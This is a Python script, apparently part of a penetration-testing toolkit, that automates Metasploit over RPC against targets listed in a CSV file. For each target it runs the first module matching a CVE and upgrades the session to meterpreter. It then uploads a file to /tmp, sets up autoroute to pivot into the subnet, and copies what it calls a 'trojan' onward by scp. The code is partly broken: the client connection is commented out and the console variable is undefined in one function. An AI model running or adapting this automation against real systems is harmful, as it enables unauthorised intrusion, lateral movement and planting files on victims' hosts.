from pymetasploit3.msfrpc import MsfRpcClient
import time
import json
import csv

# Connect to the RPC server
#client = MsfRpcClient('QmTp4Atl')

REAL_TARGET_CONFIG="Nmap_scan/scan_config.csv"

def read_scan_config():
    host_list = []
    ip_list = []
    with open('../'+REAL_TARGET_CONFIG, 'r') as csvfile:
        csv_read = csv.reader(csvfile)
        for i in csv_read:
            host_list.append(i[0])
            ip_list.append(i[1])
    print(f"--> method : read_scan_config entered. output : {host_list} and {ip_list}. file : Penetration_tools/start_attack.py")
    return host_list, ip_list

def read_json():
    with open("./attack_info.json",'r') as load_f:
        info_dict = json.load(load_f)
        print(f"--> method : read_json entered. output : {info_dict}. file : Penetration_tools/start_attack.py")
        return info_dict

def attack(ip, vul, session_num, router):
    print(f"--> method : attack entered. input : {ip} and {vul} and {session_num} and {router}. file : Penetration_tools/start_attack.py")
    cid = client.consoles.console().cid
    print(client.consoles.console(cid).write('search cve:' + vul))
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('use 0')
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('set RHOSTS ' + ip)
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('run')
    time.sleep(3)
    client.consoles.console(cid).destroy
    #shell1 = client.sessions.session(list(client.sessions.list.keys())[0])
    client.consoles.console(cid).write('sessions -u ' + str(session_num))
    time.sleep(60)
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('sessions -i ' + str(session_num + 1))
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('cd tmp')
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('upload 123.txt /tmp')
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('run autoroute -s ' + router + '.' + '0/24')
    print(client.consoles.console(cid).read())
    client.consoles.console(cid).destroy

def copy_trojan(session_num):
    print(f"-->method : copy_trojan entered. input : {session_num}. file : Penetration_tools/start_attack.py")
    client.consoles.console(cid).write('sessions -i ' + str(session_num))
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('scp /tmp/123.txt hostname@/tmp/')
    client.consoles.console(cid).destroy

if __name__ == "__main__":
    print("-->main method entered file : Penetration_tools/start_attack.py")
    print("Use real target IP addresses in '{}'".format(REAL_TARGET_CONFIG))
    host_list = read_scan_config()[0]
    ip_list = read_scan_config()[1]
    count = 0
    session_num = 1
    for i in read_json().values():
        if i != 'Trojan':
            router = ip_list[count].split('.')[0] + '.' + ip_list[count].split('.')[1] + '.' + ip_list[count].split('.')[2]
            attack(ip_list[count], i[1].strip("'"), session_num, router)
            session_num = session_num + 2
        else:
            copy_trojan(session_num)
        count = count + 1

